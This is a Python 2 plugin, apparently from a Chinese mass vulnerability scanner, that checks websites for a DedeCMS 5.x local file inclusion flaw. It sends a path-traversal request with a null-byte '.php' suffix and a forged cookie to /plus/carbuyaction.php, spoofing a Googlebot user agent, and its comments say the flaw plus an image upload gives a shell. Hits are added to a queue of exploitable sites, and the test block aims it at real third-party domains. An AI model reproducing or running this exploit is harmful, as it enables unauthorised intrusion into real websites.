#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#############################dedecms包含漏洞############################
#DedeCms 5.x 本地文件包含漏洞
#他会把图片或者其他文件档php的来运行
#配合上传图片 可拿下shell
#http://sebug.net/vuldb/ssvid-60716
import threading
import httplib
import re
#import sys

from class_Queue import url_exp

class bc_DedeCms_5x:
    def assign(self,service, arg=None):
        if service == 'DedeCms':
            return True, arg

    def scan(self,arg):
        url0, url1 = arg
        url = url1.split('//')[1]
        if not self.getcss(url1):
            css = 'index.html'+'%00.php'
        else:
            css = self.getcss(url1)+'%00.php'
        site = '''/plus/carbuyaction.php?dopost=return&code=../../%s''' % css
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                   "cookie":"code=alipay"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET',site,None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            if (httpres.status == 200) and (len(html)>0) and html[:6]!='<html>':
                url="%s%s"%(url1,site)

                EXP_list=[1,url0,url1,"CN_bc_DedeCms_5x",url,"",""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                #print EXP_list
                url_exp.put(EXP_list,0.5)   #插入队列
        except:
            pass

    def getcss(self,arg):
        url = arg.split('//')[1]
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET','/',None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            mm = r'''href="(.*?).css"'''
            gg = re.findall(mm,html)
            if gg[0].startswith('http'):
                return gg[0].split('/',3)[3]+'.css'
            else:
                return gg[0]+'.css'
        except:
            pass

################################################
if __name__=='__main__':
    class_www=bc_DedeCms_5x()
    class_www.scan(class_www.assign('DedeCms', ("http://www.baidu.com","http://meter.hu"))[1])
















